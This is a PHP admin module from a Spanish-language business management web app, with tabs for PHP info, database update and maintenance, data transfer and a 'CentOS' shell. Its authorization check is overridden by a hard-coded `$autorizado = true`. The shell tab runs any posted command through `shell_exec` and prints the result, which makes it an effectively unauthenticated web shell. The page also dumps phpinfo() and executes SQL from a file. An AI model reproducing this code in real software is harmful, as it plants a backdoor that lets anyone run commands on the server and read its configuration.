<?php

$autorizado = autorizado($userid,$option);
$admin = admin($userid,$option);
$autorizado = true;
if ($autorizado == false) {	echo "<center><br><strong>USUARIO NO AUTORIZADO</strong></center><br><br>"; }

if (($option == 1022) AND ($autorizado == true)) {

	echo "<table style=\" border-bottom : 1px solid grey; border-left : 1px solid grey; border-right : 1px solid grey; border-top : 1px solid grey;text-align:center;width:100%\" cellpadding=\"2\" cellspacing=\"2\" ><tr>";
		echo "<td style=\"width:15%;vertical-align : middle;text-align:left;\">";
			echo "<strong>".$Datos." ".$Sistema."</strong>";
		echo "</td><td style=\"width:85%;vertical-align : top;text-align:left;\">";
			echo "<table>";
				echo "<tr>";
				if ($soption == 1) {$class = "menu_select";} else {$class = "menu";}
				echo "<td class=".$class."><a href=\"index.php?op=1022&sop=1\" class=".$class.">PHP INFO</a></td>";
				if ($soption == 2) {$class = "menu";} else {$class = "menu";}
				echo "<td class=".$class."><a href=\"index.php?op=1022&sop=2\" class=".$class.">".$Actualizar." ".$Base." ".$Datos."</a></td>";
				if ($soption == 3) {$class = "menu_select";} else {$class = "menu";}
				echo "<td class=".$class."><a href=\"index.php?op=1022&sop=3\" class=".$class.">".$Mantenimiento." ".$Base." ".$Datos."</a></td>";
				if ($soption == 4) {$class = "menu_select";} else {$class = "menu";}
				echo "<td class=".$class."><a href=\"index.php?op=1022&sop=4\" class=".$class.">".$Traspasar." ".$Datos."</a></td>";
				if ($soption == 5) {$class = "menu_select";} else {$class = "menu";}
				echo "<td class=".$class."><a href=\"index.php?op=1022&sop=5\" class=".$class.">CentOS</a></td>";
				echo "</tr>";
			echo "</table>";
		echo "</td></tr>";
		echo "</table><br>";
		echo "<table  class=\"principal\"><tr>";
		echo "<td style=\"width:100%;vertical-align : top;text-align:left;\">";

	if ($soption == 1) {
		echo "<center>";
		ob_start();
		phpinfo();
		$info = ob_get_contents();
		ob_end_clean();
		$info = preg_replace('%^.*<body>(.*)</body>.*$%ms', '$1', $info);
		echo $info;
		echo "</center>";
	}

	if ($soption == 2) {
		#Abrimos el fichero en modo lectura 
		#$source_file = 'http://www.multivia.com/updates/mgestion/sql.sql';
		#$dest_file = 'mgestion/sql.sql';
		#copy($source_file, $dest_file);
		$DescriptorFichero = fopen("mgestion/sql.sql","r"); 
		while(!feof($DescriptorFichero)){ 
			$buffer = fgets($DescriptorFichero,4096); 
			$longitud = strlen($buffer)-2;
			$sql = substr($buffer, 0, $longitud);
			mysql_query(convert_sql($sql));
			echo $sql."<BR>"; 
		} 
	}

	if ($soption == 3){
		if ($ssoption == 1){
			$sqlser = "select * from sgm_incidencias_servicios where visible=0 order by servicio";
			$resultser = mysql_query(convert_sql($sqlser));
			while ($rowser = mysql_fetch_array($resultser)) {
				$sql = "update sgm_incidencias_servicios_cliente set ";
				$sql = $sql."visible=0";
				$sql = $sql." WHERE id_servicio=".$rowser["id"]."";
				mysql_query(convert_sql($sql));
			}
		}
		if ($ssoption == 2){
			$sqlser = "select * from sgm_incidencias_servicios_estados where visible=0 order by servicio";
			$resultser = mysql_query(convert_sql($sqlser));
			while ($rowser = mysql_fetch_array($resultser)) {
				$sql = "update sgm_incidencias_servicios_cliente set ";
				$sql = $sql."visible=0";
				$sql = $sql." WHERE id_estado=".$rowser["id"]."";
				mysql_query(convert_sql($sql));
			}
		}

		echo "<table style=\" border-bottom : 1px solid grey; border-left : 1px solid grey; border-right : 1px solid grey; border-top : 1px solid grey;text-align:center;width:100%\" cellpadding=\"2\" cellspacing=\"2\" ><tr>";
			echo "<td style=\"width:25%;vertical-align : top;text-align:left;\">";
				echo "<center><table><tr>";
					echo "<td style=\"height:20px;width:200px;\";><strong>".$Mantenimientos." :</strong></td>";
					$color = "#4B53AF";
					$lcolor = "white";
					if ($ssoption == 1) { $color = "white"; $lcolor = "blue"; }
					echo "<td style=\"height:20px;width:200px;text-align:center;vertical-align:middle;background-color:".$color.";border: 1px solid black\"><a href=\"index.php?op=1022&sop=3&ssop=1&usuario=".$userid."\" class=\"gris\" style=\"color:".$lcolor."\">".$Servicios." ".$Incidencias."</a></td>";
					$color = "#4B53AF";
					$lcolor = "white";
					if ($ssoption == 2) { $color = "white"; $lcolor = "blue"; }
					echo "<td style=\"height:20px;width:200px;text-align:center;vertical-align:middle;background-color:".$color.";border: 1px solid black\"><a href=\"index.php?op=1022&sop=3&ssop=2&usuario=".$userid."\" class=\"gris\" style=\"color:".$lcolor."\">".$Estados." ".$Servicios." ".$Incidencias."</a></td>";
				echo "</tr></table></center>";
		echo "</td></tr></table><br>";
	}

	if ($soption == 4) {
		echo "TRASPASO DE DATOS<br>";
		include ("mgestion/system-traspaso.php");
	}

	if ($soption == 5) {
		echo "<strong>Shell</strong><br><br>";
		echo "<center><table cellspacing=\"0\">";
			echo "<tr style=\"background-color: Silver;\">";
				echo "<td><em>".$Orden."</em></td>";
				echo "<td></td>";
			echo "</tr>";
			echo "<tr>";
				echo "<form action=\"index.php?op=1022&sop=5\" method=\"post\">";
				echo "<td><input type=\"Text\" name=\"comando\" style=\"width:300px\"></td>";
				echo "<td><input type=\"Submit\" value=\"".$Ejecutar."\" style=\"width:100px\"></td>";
				echo "</form>";
			echo "</tr>";
			echo "<tr>";
				echo "<td>&nbsp;</td>";
			echo "</tr>";
			echo "<tr>";
			$salida = shell_exec($_POST["comando"]);
				echo "<td><pre>$salida</pre></td>";
			echo "</tr>";
		echo "</table></center>";
	}

echo "</td></tr></table><br>";
}
?>
